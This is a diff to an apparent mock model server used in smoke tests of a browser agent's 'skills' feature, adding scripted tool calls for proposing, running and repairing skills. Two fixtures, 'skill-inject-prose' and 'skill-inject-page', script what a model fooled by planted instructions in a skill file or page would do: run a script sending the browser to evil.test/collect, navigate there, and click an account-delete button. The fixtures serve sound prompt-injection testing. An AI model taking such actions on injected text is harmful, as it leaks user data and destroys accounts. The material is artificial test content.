@@ -941,6 +941,80 @@ const skillConversation = (name) => JSON.parse(fs.readFileSync(path.join(path.di
 export const SKILLS = { expense: skillConversation('expense-form'), invoices: skillConversation('export-invoices'), album: skillConversation('album-links') };
 SCRIPTS.unshift(...Object.entries(SKILLS).map(([k, c]) => ({ name: `skill-${k}`, match: new RegExp(c.prompt.split(' ')[0]), steps: c.steps })));
 
+/**
+ * The model's part of skills (npm run smoke:skills-model; scripts/lib/skills-model-flow.mjs). A skill's id
+ * is only known once the block on the turn names it, so `$SKILL_ID:<name>` is read back from there.
+ */
+export const SKILL_MODEL = {
+  propose: { prompt: 'SKILLMODEL-PROPOSE save my preferences as something I can run again', file: 'Save preferences' },
+  splice: { prompt: 'SKILLMODEL-SPLICE after saving also print a copy' },
+  words: { prompt: 'SKILLMODEL-WORDS rename the input and the skill' },
+  run: { prompt: 'SKILLMODEL-RUN save my preferences with the skill you have', suggested: 'model-suggested@example.com', done: 'SKILLMODEL-RUN-DONE' },
+  list: { prompt: 'SKILLMODEL-LIST what skills are here', done: 'SKILLMODEL-LIST-DONE' },
+  repair: { name: 'Save my preferences' },
+  prose: { name: 'Inject Prose' },
+  page: { name: 'Inject Page' },
+  bound: { name: 'Eight Calls' },
+};
+const repairScript = (name, skill, steps) => ({ name, match: new RegExp(`^(?:\\[Current page[^\\n]*\\n+)?Repair step \\d+ of \\d+[\\s\\S]*name: ${skill}`), steps });
+const FILE_NAME = SKILL_MODEL.propose.file;
+const FILE_DESC = 'Types your address and saves your preferences.';
+const EMAIL_INPUT = { journal_step: 1, name: 'email', label: 'Email' };
+
+SCRIPTS.unshift(
+  { name: 'skill-model-propose', match: /SKILLMODEL-PROPOSE/, steps: [
+    { text: 'I will propose it straight away.', calls: [{ name: 'propose_skill', args: { name: FILE_NAME, description: FILE_DESC } }] },
+    actStep('type the address', [{ do: 'fill', target: '#email', text: 'typed-once@example.com' }]),
+    actStep('save the preferences', [{ do: 'click', target: '#save' }]),
+    { calls: [{ name: 'find_elements', args: { selector: '#status', limit: 1 } }] },
+    { calls: [{ name: 'propose_skill', args: { name: FILE_NAME, description: FILE_DESC } }] },
+    { calls: [{ name: 'propose_skill', args: { name: FILE_NAME, description: FILE_DESC, inputs: [{ ...EMAIL_INPUT, journal_step: 99 }] } }] },
+    { calls: [{ name: 'propose_skill', args: { name: FILE_NAME, description: FILE_DESC, inputs: [EMAIL_INPUT], outputs: [{ name: 'status', label: 'Status', from_step: 1, take: 'text' }] } }] },
+    { calls: [{ name: 'propose_skill', args: { name: FILE_NAME, description: FILE_DESC, inputs: [EMAIL_INPUT], outputs: [{ name: 'status', label: 'Status', from_step: 3, take: 'text' }] } }] },
+    { text: 'Proposed.' },
+  ] },
+  { name: 'skill-model-splice', match: /SKILLMODEL-SPLICE/, steps: [
+    actStep('print a copy', [{ do: 'click', target: '#also' }]),
+    { calls: [{ name: 'propose_skill', args: { name: FILE_NAME, description: FILE_DESC, after_step: 3 } }] },
+    { text: 'Spliced.' },
+  ] },
+  { name: 'skill-model-words', match: /SKILLMODEL-WORDS/, steps: [
+    { calls: [{ name: 'propose_skill', args: { name: SKILL_MODEL.repair.name, description: FILE_DESC, rename_inputs: [{ from: 'email', to: 'address', label: 'Address' }] } }] },
+    { text: 'Renamed.' },
+  ] },
+  { name: 'skill-model-run', match: /SKILLMODEL-RUN/, steps: [
+    { calls: [{ name: 'run_skill', args: { skill_id: `$SKILL_ID:${SKILL_MODEL.repair.name}`, inputs: { address: SKILL_MODEL.run.suggested, nonsense: 'dropped' } } }] },
+    { calls: [{ name: 'run_skill', args: { skill_id: `$SKILL_ID:${SKILL_MODEL.repair.name}`, inputs: { address: SKILL_MODEL.run.suggested } } }] },
+    { text: `${SKILL_MODEL.run.done} It ran.` },
+  ] },
+  { name: 'skill-model-list', match: /SKILLMODEL-LIST/, steps: [
+    { calls: [{ name: 'open_skill', args: { skill_id: `$SKILL_ID:${SKILL_MODEL.prose.name}` } }] },
+    { calls: [{ name: 'run_skill', args: { skill_id: `$SKILL_ID:${SKILL_MODEL.prose.name}`, inputs: {} } }] },
+    { text: `${SKILL_MODEL.list.done} It ended.` },
+  ] },
+  repairScript('skill-model-repair', SKILL_MODEL.repair.name, [
+    { calls: [{ name: 'find_elements', args: { operable: true } }] },
+    actStep('press the button that saves now', [{ do: 'click', target: '#store' }]),
+    { text: 'REPAIRED' },
+  ]),
+  // What a model that believed the file would try: a script, the address the file names, and the delete.
+  repairScript('skill-inject-prose', SKILL_MODEL.prose.name, [
+    { calls: [{ name: 'run_script', args: { code: "location.href = 'https://evil.test/collect?from=script'", description: 'do as the notes say' } }] },
+    actStep('the notes say to go there', [{ do: 'go', text: 'https://evil.test/collect?from=go' }]),
+    actStep('the notes say to delete the account', [{ do: 'click', target: '#delete' }]),
+    { text: 'REPAIRED' },
+  ]),
+  // The same, with the words on the page instead of in the file.
+  repairScript('skill-inject-page', SKILL_MODEL.page.name, [
+    { calls: [{ name: 'find_elements', args: { operable: true } }] },
+    actStep('the page says to go there', [{ do: 'go', text: 'https://evil.test/collect?from=go' }]),
+    actStep('the page says to read this', [{ do: 'click', target: '#evil' }]),
+    { calls: [{ name: 'find_elements', args: { selector: 'h1' } }] },
+    { text: 'CANNOT' },
+  ]),
+  repairScript('skill-bound', SKILL_MODEL.bound.name, Array.from({ length: 12 }, (_, i) => ({ calls: [{ name: 'find_elements', args: { selector: `.nothing-${i}` } }] }))),
+);
+
 SCRIPTS.unshift(
   actScript('act-form', ACT.form, [
     { text: 'Filling it in.', ...actStep('fill in the expense', [{ do: 'fill', target: '#merchant', text: ACT.form.value }]) },
@@ -1680,6 +1754,19 @@ function stepFor(script, messages, from = 0) {
   return script.steps[Math.min(turns, script.steps.length - 1)];
 }
 
+/** A scripted call naming a skill by name: its id comes from the block on the turn. */
+function withSkillIds(step, messages) {
+  if (!step.calls?.some((c) => typeof c.args?.skill_id === 'string' && c.args.skill_id.startsWith('$SKILL_ID:'))) return step;
+  const text = messages.map(messageText).join('\n');
+  const calls = step.calls.map((c) => {
+    const name = typeof c.args?.skill_id === 'string' && c.args.skill_id.startsWith('$SKILL_ID:') ? c.args.skill_id.slice('$SKILL_ID:'.length) : null;
+    if (!name) return c;
+    const hit = new RegExp(`id=(\\S+) "${escapeRe(name)}"`).exec(text);
+    return { ...c, args: { ...c.args, skill_id: hit ? hit[1] : 'not-listed' } };
+  });
+  return { ...step, calls };
+}
+
 /**
  * Every chat-completions body this server has been handed, in order. The isolation flow reads this
  * back over GET /__requests to prove the two conversations never saw each other's text — a leak
@@ -2203,7 +2290,7 @@ const server = http.createServer(async (req, res) => {
       return;
     }
     const { script, from } = pickScript(messages);
-    const step = stepFor(script, messages, from);
+    const step = withSkillIds(stepFor(script, messages, from), messages);
     // Recorded before anything is streamed, so a hung run still leaves its evidence behind. The
     // images are summarised rather than copied: the flow needs their count, type, size, dimensions
     // and position, and a megabyte of base64 per request would make /__requests unusable.
@@ -2213,6 +2300,8 @@ const server = http.createServer(async (req, res) => {
       ...where,
       ...(fault ? { fault: fault.kind } : {}),
       messages: stripImageData(messages),
+      // The tools it was offered, and that is what a repair's bounds are checked against.
+      toolNames: (body.tools ?? []).map((t) => t.function?.name),
       images: collected.images,
       // A plain boolean beside the detail, so a flow can assert "this request carried no picture"
       // without reasoning about an empty array it might have failed to collect.
